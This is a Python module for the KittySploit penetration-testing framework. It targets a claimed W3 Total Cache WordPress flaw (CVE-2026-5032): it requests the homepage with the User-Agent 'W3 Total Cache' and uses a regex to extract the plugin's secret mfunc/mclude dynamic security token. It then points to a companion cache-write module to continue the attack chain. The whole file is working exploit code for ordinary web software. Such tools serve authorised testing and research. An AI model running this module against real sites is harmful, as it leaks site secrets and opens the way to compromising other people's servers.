#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Total Cache CVE-2026-5032 — harvest W3TC_DYNAMIC_SECURITY via User-Agent."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_MFUNC_RE = re.compile(r"<!--\s*(?:mfunc|mclude)\s+(\S+)")


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "W3 Total Cache CVE-2026-5032 token leak",
        "description": (
            "Fetches homepage with User-Agent 'W3 Total Cache' and extracts mfunc/mclude token."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-5032"],
        "tags": ["wordpress", "w3-total-cache", "disclosure", "cve-2026-5032"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        resp = self.http_request(
            method="GET",
            path=self._join("/"),
            headers={"User-Agent": "W3 Total Cache"},
            allow_redirects=True,
        )
        body = resp.text or "" if resp else ""
        m = _MFUNC_RE.search(body)
        if not m:
            print_error("No mfunc/mclude token in response (fragments may be disabled)")
            return False
        token = m.group(1)
        print_success(f"W3TC dynamic security token: {token}")
        print_status("Chain with w3_total_cache_cve_2026_18051_cache_write if mfunc enabled")
        return True
